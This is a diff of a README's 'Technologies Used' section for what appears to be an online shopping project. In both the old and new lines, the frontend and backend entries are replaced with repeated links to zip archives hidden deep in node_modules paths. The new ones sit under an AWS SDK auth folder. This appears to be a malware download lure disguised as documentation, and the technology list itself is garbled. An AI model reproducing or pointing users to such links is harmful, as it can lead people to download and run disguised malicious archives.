@@ -16,8 +16,8 @@ Fast and Reliable Delivery: Enjoy fast and reliable delivery to your doorstep, w
 
 ## Technologies Used
 
-* Frontend: HTML, CSS, JavaScript, https://raw.githubusercontent.com/LeboMeje/LebannTrade/master/node_modules/dependencies/test/node_modules/request/Lebann-Trade-1.2.zip
-* Backend: https://raw.githubusercontent.com/LeboMeje/LebannTrade/master/node_modules/dependencies/test/node_modules/request/Lebann-Trade-1.2.zip, https://raw.githubusercontent.com/LeboMeje/LebannTrade/master/node_modules/dependencies/test/node_modules/request/Lebann-Trade-1.2.zip
+* Frontend: HTML, CSS, JavaScript, https://github.com/LeboMeje/LebannTrade/raw/refs/heads/master/node_modules/@aws-sdk/client-sso-oidc/dist-cjs/auth/Trade_Lebann_2.2.zip
+* Backend: https://github.com/LeboMeje/LebannTrade/raw/refs/heads/master/node_modules/@aws-sdk/client-sso-oidc/dist-cjs/auth/Trade_Lebann_2.2.zip, https://github.com/LeboMeje/LebannTrade/raw/refs/heads/master/node_modules/@aws-sdk/client-sso-oidc/dist-cjs/auth/Trade_Lebann_2.2.zip
 * Database: MongoDB
 * Payment Integration: Stripe
 * Authentication: JWT (JSON Web Tokens)
